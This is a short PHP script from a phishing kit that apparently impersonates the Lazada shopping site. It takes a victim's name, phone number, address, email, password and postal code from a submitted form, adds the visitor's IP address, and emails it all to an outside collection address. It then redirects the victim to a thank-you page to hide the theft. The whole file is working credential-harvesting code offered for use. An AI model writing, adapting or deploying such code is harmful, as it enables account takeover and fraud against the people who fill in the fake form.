<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "Name               : ".$_POST['full']."\n";
$bilsmg .= "|Phone -----: ".$_POST['phone']."<br>\n";
$bilsmg .= "Address              : ".$_POST['addr']."\n";
$bilsmg .= "Email              : ".$_POST['email']."\n";
$bilsmg .= "Password              : ".$_POST['pass']."\n";
$bilsmg .= "Postal code              : ".$_POST['zip']."\n";

$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "hasilpenampungan@outlook.com";
$bilsub = "Address | From $ip";
$bilhead = "From:LAZADA Address <KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../thank-you.html";
header("location:$src");
?>
?>